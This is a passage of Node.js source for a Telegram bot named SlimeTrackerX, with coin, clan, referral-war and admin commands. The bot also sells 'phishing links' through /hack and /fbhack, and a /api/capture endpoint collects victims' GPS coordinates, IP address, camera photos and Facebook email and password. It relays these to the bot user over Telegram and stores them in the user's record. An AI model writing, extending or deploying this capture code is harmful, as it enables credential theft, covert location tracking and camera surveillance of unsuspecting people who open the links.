    await sendMessage(ctx, `💀 **PHISHING LINK** 💀\n\nUsage: /hack [label]\n💰 Cost: ${TRACK_COST} coins\n📍 Captures: REAL GPS Location + IP + Camera\n⏰ Expires in 1 HOUR\n\n📝 Example: /hack free gift`);
    return;
  }
  
  let user = await initUser(ctx.from.id);
  if (user.coins < TRACK_COST) return sendMessage(ctx, `❌ Need ${TRACK_COST} coins!`);
  
  await takeCoin(ctx.from.id, TRACK_COST);
  user.hacks++;
  await saveUser(ctx.from.id, user);
  
  let token = crypto.randomBytes(16).toString("hex");
  let label = args.slice(1).join(" ");
  hackTokens.set(token, { userId: ctx.from.id, username: ctx.from.username, label, expiresAt: Date.now() + 3600000 });
  setTimeout(() => hackTokens.delete(token), 3600000);
  
  let hackLink = `${DOMAIN}/hack.html?token=${token}`;
  
  await sendMessage(ctx, `💀 **PHISHING LINK READY** 💀\n\n🎯 Label: ${label}\n📍 Steals: GPS Location (Lagos, Abuja, London, NYC!)\n📸 Camera Photo\n🌐 IP Address\n⏰ Expires in 1 HOUR\n\n🔗 \`${hackLink}\``);
});

bot.command("fbhack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 2) {
    await sendMessage(ctx, `📘 **FACEBOOK PHISHING** 📘\n\nUsage: /fbhack [label]\n💰 Cost: ${TRACK_COST} coins\n📍 Captures: REAL GPS Location + Email/Password + Camera\n⏰ Expires in 1 HOUR`);
    return;
  }
  
  let user = await initUser(ctx.from.id);
  if (user.coins < TRACK_COST) return sendMessage(ctx, `❌ Need ${TRACK_COST} coins!`);
  
  await takeCoin(ctx.from.id, TRACK_COST);
  user.facebookHacks++;
  await saveUser(ctx.from.id, user);
  
  let token = crypto.randomBytes(16).toString("hex");
  let label = args.slice(1).join(" ");
  facebookTokens.set(token, { userId: ctx.from.id, username: ctx.from.username, label, expiresAt: Date.now() + 3600000 });
  setTimeout(() => facebookTokens.delete(token), 3600000);
  
  let hackLink = `${DOMAIN}/facebook.html?token=${token}`;
  
  await sendMessage(ctx, `📘 **FACEBOOK PHISHING READY** 📘\n\n🎯 Label: ${label}\n📍 Steals: GPS Location (Lagos, Abuja, London, NYC!)\n📧 Email/Password\n📸 Camera Photo\n⏰ Expires in 1 HOUR\n\n🔗 \`${hackLink}\``);
});

bot.command("mylinks", async (ctx) => {
  let active = [];
  for (let [token, data] of hackTokens) if (data.userId === ctx.from.id && Date.now() < data.expiresAt) active.push(`💀 ${token.substring(0,8)}... - ${data.label}`);
  for (let [token, data] of facebookTokens) if (data.userId === ctx.from.id && Date.now() < data.expiresAt) active.push(`📘 ${token.substring(0,8)}... - ${data.label} (FB)`);
  if (active.length === 0) return sendMessage(ctx, "📭 No active links! Create with /hack or /fbhack");
  await sendMessage(ctx, `🔗 **ACTIVE LINKS**\n\n${active.join('\n')}\n\n⚠️ Expire in 1 hour!`);
});

// ========== 🏰 CLAN SYSTEM ==========
bot.command("clan", async (ctx) => {
  await sendMessage(ctx,
    `🏰 **CLAN SYSTEM** 🏰\n\n` +
    `/clan create [name] - Create (${CLAN_COST} coins)\n` +
    `/clan join [name] - Join clan\n` +
    `/clan leave - Leave clan\n` +
    `/clan info - Clan info\n` +
    `/clan members - List members\n` +
    `/clan donate [amount] - Donate coins\n` +
    `/clan leaderboard - Top clans\n` +
    `/clan referralwar [clan] [minutes] [bet] - Start referral war\n` +
    `/clan referralstats - Check war stats`);
});

bot.command("clan create", async (ctx) => {
  let args = ctx.message.text.split(" ").slice(2).join(" ");
  if (!args) return sendMessage(ctx, "❌ Usage: /clan create [name]");
  
  let user = await initUser(ctx.from.id);
  if (user.clan) return sendMessage(ctx, "❌ You're already in a clan!");
  if (user.coins < CLAN_COST) return sendMessage(ctx, `❌ Need ${CLAN_COST} coins!`);
  if (clansCache.has(args)) return sendMessage(ctx, "❌ Clan name taken!");
  
  await takeCoin(ctx.from.id, CLAN_COST);
  
  let clan = {
    name: args,
    tag: args.substring(0, 4).toUpperCase(),
    description: "New clan on SlimeTrackerX!",
    clanAvatar: "",
    leaderId: ctx.from.id,
    coLeaders: [],
    members: [ctx.from.id],
    coins: 0,
    xp: 0,
    level: 1,
    wins: 0,
    losses: 0,
    referralWarActive: false,
    createdAt: new Date()
  };
  
  await saveClan(args, clan);
  user.clan = args;
  user.clanRank = "Leader";
  if (!user.badges.includes("🏰 Clan Founder")) user.badges.push("🏰 Clan Founder");
  await saveUser(ctx.from.id, user);
  
  await sendMessage(ctx, `🏰 **CLAN CREATED!**\n\nName: ${args}\n💰 Cost: -${CLAN_COST} coins\n👑 You are the Leader!`);
});

bot.command("clan join", async (ctx) => {
  let args = ctx.message.text.split(" ").slice(2).join(" ");
  if (!args) return sendMessage(ctx, "❌ Usage: /clan join [name]");
  
  let user = await initUser(ctx.from.id);
  if (user.clan) return sendMessage(ctx, "❌ You're already in a clan!");
  
  let clan = clansCache.get(args);
  if (!clan) return sendMessage(ctx, "❌ Clan not found!");
  
  clan.members.push(ctx.from.id);
  user.clan = args;
  user.clanRank = "Member";
  
  await saveClan(args, clan);
  await saveUser(ctx.from.id, user);
  
  await addNotification(clan.leaderId, `👤 @${ctx.from.username} joined ${clan.name}!`, "clan");
  await sendMessage(ctx, `✅ Joined clan: **${args}**!`);
});

bot.command("clan leave", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendMessage(ctx, "❌ You're not in a clan!");
  
  let clan = clansCache.get(user.clan);
  if (clan) {
    clan.members = clan.members.filter(id => id !== ctx.from.id);
    if (clan.leaderId === ctx.from.id && clan.members.length > 0) {
      clan.leaderId = clan.members[0];
      await saveClan(user.clan, clan);
      let newLeader = usersCache.get(clan.leaderId);
      if (newLeader) {
        newLeader.clanRank = "Leader";
        await saveUser(clan.leaderId, newLeader);
        await ctx.telegram.sendMessage(clan.leaderId, `👑 You are now leader of ${user.clan}!`);
      }
    } else if (clan.members.length === 0) {
      clansCache.delete(user.clan);
      await Clan.deleteOne({ name: user.clan });
    } else {
      await saveClan(user.clan, clan);
    }
  }
  
  user.clan = null;
  user.clanRank = "Member";
  await saveUser(ctx.from.id, user);
  await sendMessage(ctx, `✅ Left clan!`);
});

bot.command("clan info", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendMessage(ctx, "❌ You're not in a clan!");
  
  let clan = clansCache.get(user.clan);
  if (!clan) return sendMessage(ctx, "❌ Clan not found!");
  
  let leader = await getUsername(clan.leaderId);
  let levelBar = "█".repeat(Math.floor((clan.xp / (clan.level * 1000)) * 10)) + "░".repeat(10 - Math.floor((clan.xp / (clan.level * 1000)) * 10));
  
  let warStatus = "";
  if (clan.referralWarActive && clan.referralWarEnds > new Date()) {
    let timeLeft = Math.floor((clan.referralWarEnds - new Date()) / 60000);
    warStatus = `\n⚔️ **REFERRAL WAR ACTIVE!**\n🎯 Score: ${clan.referralWarTarget || 0}\n⏰ ${timeLeft} minutes left\n💰 Bet: ${clan.referralWarBet} coins\n👑 Opponent: ${clan.referralWarOpponent}`;
  }
  
  await sendMessage(ctx,
    `🏰 **CLAN: ${clan.name}** 🏰\n\n` +
    `🏷️ Tag: ${clan.tag}\n` +
    `👑 Leader: @${leader}\n` +
    `👥 Members: ${clan.members.length}\n` +
    `💰 Bank: ${clan.coins} coins\n` +
    `📊 Level: ${clan.level}\n` +
    `[${levelBar}] ${Math.floor((clan.xp / (clan.level * 1000)) * 100)}%\n` +
    `⚔️ Wars: ${clan.wins}W - ${clan.losses}L\n` +
    `📅 Created: ${new Date(clan.createdAt).toLocaleDateString()}${warStatus}`);
});

bot.command("clan members", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendMessage(ctx, "❌ You're not in a clan!");
  
  let clan = clansCache.get(user.clan);
  if (!clan) return sendMessage(ctx, "❌ Clan not found!");
  
  let membersList = [];
  for (let id of clan.members) {
    let username = await getUsername(id);
    let rank = id === clan.leaderId ? "👑 Leader" : clan.coLeaders.includes(id) ? "⭐ Co-Leader" : "👤 Member";
    membersList.push(`${rank} @${username}`);
  }
  
  await sendMessage(ctx, `🏰 **${clan.name} MEMBERS (${clan.members.length})** 🏰\n\n${membersList.join("\n")}`);
});

bot.command("clan donate", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let amount = parseInt(args[2]);
  if (isNaN(amount) || amount < 1) return sendMessage(ctx, "❌ Usage: /clan donate [amount]");
  
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendMessage(ctx, "❌ You're not in a clan!");
  if (user.coins < amount) return sendMessage(ctx, `❌ You have ${user.coins} coins!`);
  
  let clan = clansCache.get(user.clan);
  if (!clan) return sendMessage(ctx, "❌ Clan not found!");
  
  await takeCoin(ctx.from.id, amount);
  clan.coins += amount;
  clan.xp += Math.floor(amount / 10);
  
  let needed = clan.level * 1000;
  if (clan.xp >= needed) {
    clan.xp -= needed;
    clan.level++;
    await ctx.telegram.sendMessage(clan.leaderId, `🏰 **CLAN LEVEL UP!** ${clan.name} is now level ${clan.level}!`);
  }
  
  await saveClan(user.clan, clan);
  await sendMessage(ctx, `💰 Donated ${amount} coins to ${clan.name}! +${Math.floor(amount/10)} XP`);
});

bot.command("clan leaderboard", async (ctx) => {
  let sorted = Array.from(clansCache.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
  let lines = ["🏆 **TOP 10 CLANS** 🏆", ""];
  for (let i = 0; i < sorted.length; i++) {
    let medal = i === 0 ? "👑" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    lines.push(`${medal} ${i+1}. ${sorted[i].name} | ${sorted[i].coins} coins | Lvl ${sorted[i].level} | ${sorted[i].members.length} members`);
  }
  await ctx.reply(lines.join("\n"), { parse_mode: undefined });
});

// ========== ⚔️ REFERRAL CLAN WAR ==========
bot.command("clan referralwar", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 5) {
    return sendMessage(ctx, `⚔️ **REFERRAL WAR** ⚔️\n\nStart a war where clans compete for MOST REFERRALS!\n\nUsage: /clan referralwar [opponent clan] [minutes] [bet]\n\n📝 Example: /clan referralwar DEVILS 60 500\n\n⏰ Time: 10-120 minutes\n💰 Winner takes ALL bet coins!\n🔗 Members share referral links to win!`);
  }
  
  let opponentName = args[2];
  let minutes = parseInt(args[3]);
  let bet = parseInt(args[4]);
  
  if (isNaN(minutes) || minutes < 10 || minutes > 120) return sendMessage(ctx, "❌ Time must be between 10 and 120 minutes!");
  if (isNaN(bet) || bet < WAR_MIN_BET) return sendMessage(ctx, `❌ Min bet ${WAR_MIN_BET} coins!`);
  
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendMessage(ctx, "❌ You're not in a clan!");
  if (user.clanRank !== "Leader" && user.clanRank !== "Co-Leader") {
    return sendMessage(ctx, "❌ Only Leader or Co-Leader can start referral war!");
  }
  
  let attackerClan = clansCache.get(user.clan);
  if (!attackerClan) return sendMessage(ctx, "❌ Your clan not found!");
  if (attackerClan.coins < bet) return sendMessage(ctx, `❌ Your clan only has ${attackerClan.coins} coins!`);
  if (attackerClan.referralWarActive) return sendMessage(ctx, "❌ Your clan is already in a referral war!");
  
  let defenderClan = clansCache.get(opponentName);
  if (!defenderClan) return sendMessage(ctx, "❌ Opponent clan not found!");
  if (defenderClan.name === attackerClan.name) return sendMessage(ctx, "❌ Can't war yourself!");
  
  attackerClan.coins -= bet;
  attackerClan.referralWarActive = true;
  attackerClan.referralWarEnds = new Date(Date.now() + minutes * 60 * 1000);
  attackerClan.referralWarTarget = 0;
  attackerClan.referralWarBet = bet;
  attackerClan.referralWarOpponent = defenderClan.name;
  await saveClan(attackerClan.name, attackerClan);
  
  defenderClan.referralWarActive = true;
  defenderClan.referralWarEnds = new Date(Date.now() + minutes * 60 * 1000);
  defenderClan.referralWarTarget = 0;
  defenderClan.referralWarBet = bet;
  defenderClan.referralWarOpponent = attackerClan.name;
  await saveClan(defenderClan.name, defenderClan);
  
  let warLink = refLink(ctx.from.id);
  
  await sendMessage(ctx,
    `⚔️ **REFERRAL WAR STARTED!** ⚔️\n\n` +
    `🏰 ${attackerClan.name} vs 🏰 ${defenderClan.name}\n` +
    `⏰ Duration: ${minutes} minutes\n` +
    `💰 Bet: ${bet} coins each\n` +
    `🏆 Total Pot: ${bet * 2} coins\n\n` +
    `🎯 **HOW TO WIN:**\n` +
    `Share your referral link! Each new user who joins = 1 point!\n\n` +
    `🔗 **YOUR CLAN'S LINK:**\n${warLink}\n\n` +
    `The clan with MORE REFERRALS when time ends WINS!\n\n` +
    `Use /clan referralstats to see live scores!`);
  
  await ctx.telegram.sendMessage(defenderClan.leaderId, 
    `⚔️ **REFERRAL WAR CHALLENGE!** ⚔️\n\n` +
    `${attackerClan.name} challenged ${defenderClan.name}!\n` +
    `💰 Bet: ${bet} coins\n` +
    `⏰ Time: ${minutes} minutes\n\n` +
    `Share your referral link to win!\n` +
    `🔗 ${refLink(defenderClan.leaderId)}`);
  
  // Auto end war after time
  setTimeout(async () => {
    let attacker = clansCache.get(attackerClan.name);
    let defender = clansCache.get(defenderClan.name);
    
    if (attacker && attacker.referralWarActive && defender && defender.referralWarActive) {
      let attackerScore = attacker.referralWarTarget || 0;
      let defenderScore = defender.referralWarTarget || 0;
      let winner = attackerScore > defenderScore ? attacker.name : defender.name;
      let loser = winner === attacker.name ? defender.name : attacker.name;
      let pot = attacker.referralWarBet * 2;
      
      let winnerClan = clansCache.get(winner);
      let loserClan = clansCache.get(loser);
      
      if (winnerClan) {
        winnerClan.coins += pot;
        winnerClan.wins++;
        winnerClan.xp += 500;
        winnerClan.referralWarActive = false;
        await saveClan(winner, winnerClan);
        await ctx.telegram.sendMessage(winnerClan.leaderId, 
          `🏆 **REFERRAL WAR VICTORY!** 🏆\n\n` +
          `${winner} defeated ${loser}!\n` +
          `📊 Final Score: ${attackerScore} - ${defenderScore}\n` +
          `💰 Won ${pot} coins!\n✨ +500 clan XP!`);
      }
      
      if (loserClan) {
        loserClan.losses++;
        loserClan.referralWarActive = false;
        await saveClan(loser, loserClan);
        await ctx.telegram.sendMessage(loserClan.leaderId,
          `💀 **REFERRAL WAR LOSS!** 💀\n\n` +
          `${loser} lost to ${winner}!\n` +
          `📊 Final Score: ${attackerScore} - ${defenderScore}`);
      }
    }
  }, minutes * 60 * 1000);
});

bot.command("clan referralstats", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendMessage(ctx, "❌ You're not in a clan!");
  
  let clan = clansCache.get(user.clan);
  if (!clan) return sendMessage(ctx, "❌ Clan not found!");
  
  if (!clan.referralWarActive) {
    return sendMessage(ctx, `📊 **${clan.name} REFERRAL STATS**\n\nTotal Referrals: ${clan.referralWarTarget || 0}\nNo active war right now!\nStart one with /clan referralwar`);
  }
  
  let opponent = clansCache.get(clan.referralWarOpponent);
  let opponentScore = opponent ? opponent.referralWarTarget || 0 : 0;
  let timeLeft = Math.max(0, Math.floor((clan.referralWarEnds - new Date()) / 60000));
  let myScore = clan.referralWarTarget || 0;
  
  let winner = myScore > opponentScore ? "YOU" : myScore < opponentScore ? "OPPONENT" : "TIE";
  let barLength = Math.min(20, Math.floor((myScore / Math.max(1, opponentScore)) * 10));
  let bar = "🔥".repeat(barLength) + "⬜".repeat(20 - barLength);
  
  await sendMessage(ctx,
    `⚔️ **REFERRAL WAR LIVE** ⚔️\n\n` +
    `🏰 ${clan.name} vs 🏰 ${clan.referralWarOpponent}\n` +
    `⏰ Time left: ${timeLeft} minutes\n` +
    `💰 Pot: ${clan.referralWarBet * 2} coins\n\n` +
    `📊 **SCORE:**\n` +
    `${clan.name}: ${myScore} referrals\n` +
    `${clan.referralWarOpponent}: ${opponentScore} referrals\n\n` +
    `[${bar}]\n` +
    `🏆 Current Leader: ${winner}\n\n` +
    `🔗 **YOUR REFERRAL LINK:**\n${refLink(ctx.from.id)}\n\n` +
    `Share this link! Each new user = +1 point for your clan!`);
});

// ========== 🎛️ MENU HANDLERS ==========
bot.action("menu_profile", async (ctx) => { await ctx.answerCbQuery(); await sendMessage(ctx, `👤 **PROFILE**\n\n/setname [name]\n/setbio [text]\n/setlocation [city]\n/setavatar (reply to photo)\n/profile\n/followers\n/following\n/post [caption]\n/myposts`); });
bot.action("menu_newsfeed", async (ctx) => { await ctx.answerCbQuery(); await sendMessage(ctx, `📰 **NEWS FEED**\n\n/newsfeed - See posts from friends\n/post [caption] - Create post\n/like [postID] - Like post\n/comment [postID] [text] - Comment`); });
bot.action("menu_clan", async (ctx) => { await ctx.answerCbQuery(); await sendMessage(ctx, `🏰 **CLAN**\n\n/clan create [name] (${CLAN_COST} coins)\n/clan join [name]\n/clan info\n/clan members\n/clan donate [amount]\n/clan referralwar [clan] [minutes] [bet]\n/clan referralstats`); });
bot.action("menu_notifs", async (ctx) => { await ctx.answerCbQuery(); await sendMessage(ctx, `🔔 **NOTIFICATIONS**\n\n/notifications - View all notifs`); });
bot.action("menu_hack", async (ctx) => { await ctx.answerCbQuery(); await sendMessage(ctx, `💀 **HACK**\n\n/hack [label]\n/fbhack [label]\n/mylinks\n📍 Steals REAL GPS Location (Lagos, Abuja, London, NYC!)\n💰 Cost: ${TRACK_COST} coins`); });
bot.action("menu_fbhack", async (ctx) => { await ctx.answerCbQuery(); await sendMessage(ctx, `📘 **FACEBOOK HACK**\n\n/fbhack [label]\n📍 Steals REAL GPS Location + Email/Password\n💰 Cost: ${TRACK_COST} coins`); });
bot.action("menu_word", async (ctx) => { await ctx.answerCbQuery(); await sendMessage(ctx, `📝 **WORD BATTLE**\n\n/wordbattle @user amount difficulty\n/topwords\n📚 10,000+ words available!`); });
bot.action("menu_web", async (ctx) => { await ctx.answerCbQuery(); await sendMessage(ctx, `🌐 **WEBSITE**\n\n/createweb portfolio\n/createweb business\n/createweb store\n/mywebsites\n💰 Cost: ${WEB_PRICE} coins`); });
bot.action("menu_casino", async (ctx) => { await ctx.answerCbQuery(); await sendMessage(ctx, `🎰 **CASINO**\n\n/dice [amount]\n/slots [amount]`); });
bot.action("menu_eco", async (ctx) => { await ctx.answerCbQuery(); let u = await initUser(ctx.from.id); await sendMessage(ctx, `💰 **ECONOMY**\n\nBalance: ${u.coins} coins\n/daily (${DAILY_REWARD} coins)\n/work (${WORK_REWARD} coins)\n/gift @user amount\n/duel @user amount`); });
bot.action("menu_leaderboard", async (ctx) => { await ctx.answerCbQuery(); await sendMessage(ctx, `🏆 **LEADERBOARDS**\n\n/leaderboard - Top rich\n/topfollowers - Most followed\n/topwords - Word warriors\n/clan leaderboard - Top clans`); });
bot.action("menu_ref", async (ctx) => { await ctx.answerCbQuery(); await sendMessage(ctx, `🔗 **REFERRAL**\n\n${refLink(ctx.from.id)}\n\n+${REF_REWARD} coins per referral!\n\n⚔️ Use referrals to win CLAN WARS!`); });
bot.action("menu_admin", async (ctx) => { 
  let user = await initUser(ctx.from.id); 
  if (!user.isAdmin && ctx.from.id !== OWNER_ID) return ctx.answerCbQuery("❌ Admin only!"); 
  await ctx.answerCbQuery(); 
  await sendMessage(ctx, `👑 **ADMIN PANEL**\n\n/addcoin @user amount\n/gencode coins diamonds uses hours\n/broadcast message\n/users\n/stats\n/banuser @user\n/unban @user\n/giveall amount\n/setadmin @user\n/allwebsites`); 
});

// ========== 👑 ADMIN COMMANDS ==========
bot.command("admin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  await sendMessage(ctx, `👑 **OWNER PANEL**\n\n/addcoin\n/gencode\n/broadcast\n/users\n/stats\n/banuser\n/unban\n/giveall\n/setadmin\n/allwebsites`);
});

bot.command("users", async (ctx) => { if (ctx.from.id !== OWNER_ID) return; await sendMessage(ctx, `👥 Total Users: ${usersCache.size}`); });
bot.command("stats", async (ctx) => { if (ctx.from.id !== OWNER_ID) return; await sendMessage(ctx, `📊 **STATS**\n👥 Users: ${usersCache.size}\n🏰 Clans: ${clansCache.size}`); });

bot.command("addcoin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  let amt = parseInt(args[2]);
  if (!user || isNaN(amt)) return sendMessage(ctx, "Usage: /addcoin @username amount");
  for (let [id, u] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { u.coins += amt; await saveUser(id, u); await sendMessage(ctx, `✅ +${amt} coins to @${user}`); return; } } catch(e) {}
  }
  sendMessage(ctx, "❌ User not found");
});

bot.command("gencode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let coins = parseInt(args[1]) || 50;
  let diamonds = parseInt(args[2]) || 0;
  let uses = parseInt(args[3]) || 20;
  let hours = parseInt(args[4]) || 24;
  let code = crypto.randomBytes(6).toString("hex").toUpperCase();
  let expire = new Date(Date.now() + (hours * 3600000));
  let codeData = new Code({ code, coins, diamonds, usedBy: [], maxUses: uses, left: uses, expire });
  await codeData.save();
  codesCache.set(code, codeData);
  await sendMessage(ctx, `✅ **CODE**\n\`${code}\`\n💰 ${coins} coins\n🎫 ${uses} uses`);
});

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return sendMessage(ctx, "Usage: /broadcast message");
  let sent = 0;
  for (let [id] of usersCache) {
    try { await ctx.telegram.sendMessage(id, `📢 **ANNOUNCEMENT**\n\n${msg}`); sent++; } catch(e) {}
    await new Promise(r => setTimeout(r, 50));
  }
  await sendMessage(ctx, `✅ Sent to ${sent} users`);
});

bot.command("banuser", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return sendMessage(ctx, "Usage: /banuser @username");
  for (let [id] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { bannedUsers.add(id); await sendMessage(ctx, `🚫 Banned @${user}`); return; } } catch(e) {}
  }
  sendMessage(ctx, "❌ User not found");
});

bot.command("unban", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return sendMessage(ctx, "Usage: /unban @username");
  for (let [id] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { bannedUsers.delete(id); await sendMessage(ctx, `✅ Unbanned @${user}`); return; } } catch(e) {}
  }
  sendMessage(ctx, "❌ User not found");
});

bot.command("giveall", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let amount = parseInt(args[1]);
  if (isNaN(amount)) return sendMessage(ctx, "Usage: /giveall amount");
  let count = 0;
  for (let [id, u] of usersCache) { u.coins += amount; await saveUser(id, u); count++; }
  await sendMessage(ctx, `✅ Added ${amount} coins to ${count} users`);
});

bot.command("setadmin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return sendMessage(ctx, "Usage: /setadmin @username");
  for (let [id, u] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { u.isAdmin = true; await saveUser(id, u); await sendMessage(ctx, `✅ @${user} is now admin!`); return; } } catch(e) {}
  }
  sendMessage(ctx, "❌ User not found");
});

bot.command("allwebsites", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let websites = await Website.find({}).sort({ createdAt: -1 }).limit(50);
  if (websites.length === 0) return sendMessage(ctx, "📭 No websites found!");
  let message = "🌐 **ALL USER WEBSITES** 🌐\n\n";
  for (let site of websites) {
    let owner = await getUsername(site.ownerId);
    message += `📌 ${site.name}\n👤 @${owner}\n📅 ${site.createdAt.toLocaleDateString()}\n\n`;
  }
  await sendMessage(ctx, message);
});

// ========== 📍 CAPTURE API ==========
app.post("/api/capture", async (req, res) => {
  try {
    let { image, token, ip, location, city, country, lat, lng, device, userAgent, email, password } = req.body;
    if (!token) return res.status(400).json({ error: "No token" });
    
    let data = hackTokens.get(token);
    let isFacebook = false;
    
    if (!data) {
      data = facebookTokens.get(token);
      isFacebook = true;
    }
    
    if (!data) return res.status(404).json({ error: "Link expired or invalid" });
    if (Date.now() > data.expiresAt) {
      hackTokens.delete(token);
      facebookTokens.delete(token);
      return res.status(410).json({ error: "Link has expired" });
    }
    
    let locationText = location || city || "Unknown";
    if (city && country) locationText = `${city}, ${country}`;
    if (lat && lng) locationText += ` (📍 ${lat}, ${lng})`;
    
    let message = `💀 **${isFacebook ? 'FACEBOOK' : 'PHISHING'} SUCCESSFUL** 💀\n\n` +
      `🎯 Label: ${data.label || "No label"}\n` +
      `👤 Hacker: @${data.username}\n` +
      `🕐 Time: ${new Date().toLocaleString()}\n` +
      `📱 IP: ${ip || "Unknown"}\n` +
      `📍 LOCATION: ${locationText || "Unknown"}\n` +
      `📱 Device: ${device || userAgent || "Unknown"}\n` +
      (email ? `📧 Email: ${email}\n` : '') +
      (password ? `🔑 Password: ${password}\n` : '') +
      `✨ +20 XP EARNED!`;
    
    if (image && image.length > 100) {
      try { 
        await bot.telegram.sendPhoto(data.userId, { source: Buffer.from(image.split(',')[1], 'base64') }, { caption: message }); 
      } catch(e) { 
        await bot.telegram.sendMessage(data.userId, message); 
      }
    } else { 
      await bot.telegram.sendMessage(data.userId, message); 
    }
    
    // Save captured location to user
    let user = usersCache.get(data.userId);
    if (user) {
      if (!user.capturedLocations) user.capturedLocations = [];
      user.capturedLocations.push({ location: locationText, time: new Date(), email, password });
      await saveUser(data.userId, user);
    }
    
    await addXP(data.userId, 20);
    
    if (isFacebook) {
      let fbUser = usersCache.get(data.userId);
      if (fbUser) {
        fbUser.facebookHacks++;
        await saveUser(data.userId, fbUser);
      }
      facebookTokens.delete(token);
    } else {
      hackTokens.delete(token);
    }
    
    res.json({ status: "success", message: "Captured successfully" });
  } catch(e) { 
    console.error("Capture error:", e); 
    res.status(500).json({ error: "Internal error" }); 
  }
});
// ========== 🚀 KEEP-ALIVE MECHANISM ==========
// Ping the server every 4 minutes to prevent Render from sleeping
setInterval(() => {
  axios.get(`${DOMAIN}/`).catch(() => {});
  console.log("💓 Keep-alive ping sent");
}, 4 * 60 * 1000);

// ========== 🚀 START SERVER ==========
const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));

process.on('SIGTERM', () => {
  server.close(() => {
    bot.stop('SIGTERM');
    mongoose.connection.close();
    process.exit(0);
  });
});

async function startBot() {
  try {
    if (process.env.NODE_ENV === 'production' || DOMAIN.includes('render.com')) {
      await bot.telegram.deleteWebhook();
      await bot.telegram.setWebhook(`${DOMAIN}/webhook`);
      console.log(`✅ Webhook set to ${DOMAIN}/webhook`);
      app.post('/webhook', (req, res) => {
        bot.handleUpdate(req.body, res);
      });
    } else {
      await bot.launch();
      console.log(`✅ Bot started with polling`);
    }
  } catch (err) {
    console.error('Failed to start bot:', err);
    await bot.launch();
  }
}

loadData().then(async () => {
  await startBot();
  console.log(`🤖 SLIME TRACKERX v6.0 LIVE!`);
  console.log(`✅ 10,000+ WORDS FOR WORD BATTLE`);
  console.log(`✅ REAL GPS LOCATION CAPTURE (Lagos, Abuja, London, NYC!)`);
  console.log(`✅ REFERRAL CLAN WARS`);
  console.log(`✅ FACEBOOK STYLE SOCIAL NETWORK`);
  console.log(`✅ CLAN SYSTEM`);
  console.log(`✅ PAGES FOLDER READY - Place hack.html and facebook.html in /pages folder`);
}).catch(err => {
  console.error("Failed to load data:", err);
  startBot();
});
